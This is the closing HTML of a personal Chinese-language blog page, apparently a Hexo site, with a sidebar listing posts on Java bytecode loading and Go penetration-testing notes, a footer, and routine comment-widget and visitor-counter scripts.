title="java字节码加载的相关笔记"><img src="/img/image/9.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java字节码加载的相关笔记"/></a><div class="content"><a class="title" href="/posts/42607.html" title="java字节码加载的相关笔记">java字节码加载的相关笔记</a><time datetime="2022-03-11T12:34:06.000Z" title="发表于 2022-03-11 20:34:06">2022-03-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/166.html" title="Go渗透测试笔记(七)"><img src="/img/image/8.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Go渗透测试笔记(七)"/></a><div class="content"><a class="title" href="/posts/166.html" title="Go渗透测试笔记(七)">Go渗透测试笔记(七)</a><time datetime="2022-03-05T12:31:26.000Z" title="发表于 2022-03-05 20:31:26">2022-03-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/36907.html" title="Go渗透测试笔记(六)"><img src="/img/image/7.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Go渗透测试笔记(六)"/></a><div class="content"><a class="title" href="/posts/36907.html" title="Go渗透测试笔记(六)">Go渗透测试笔记(六)</a><time datetime="2022-03-05T03:16:23.000Z" title="发表于 2022-03-05 11:16:23">2022-03-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/12296.html" title="Go渗透测试笔记(五)"><img src="/img/image/6.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Go渗透测试笔记(五)"/></a><div class="content"><a class="title" href="/posts/12296.html" title="Go渗透测试笔记(五)">Go渗透测试笔记(五)</a><time datetime="2022-03-04T10:17:05.000Z" title="发表于 2022-03-04 18:17:05">2022-03-04</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/image/13.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By h0ld1rs</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"><script>(()=>{
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'commnet-1gmkug2k1ca99452',
      region: '',
      onCommentLoaded: function () {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.vemoji)'))
      }
    }, null))
  }

  const getCount = () => {
    twikoo.getCommentsCount({
      envId: 'commnet-1gmkug2k1ca99452',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(function (res) {
      document.getElementById('twikoo-count').innerText = res[0].count
    }).catch(function (err) {
      console.error(err);
    });
  }

  const runFn = () => {
    init()
    GLOBAL_CONFIG_SITE.isPost && getCount()
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') {
      setTimeout(runFn,0)
      return
    } 
    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = () => {
      loadTwikoo()
    }
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>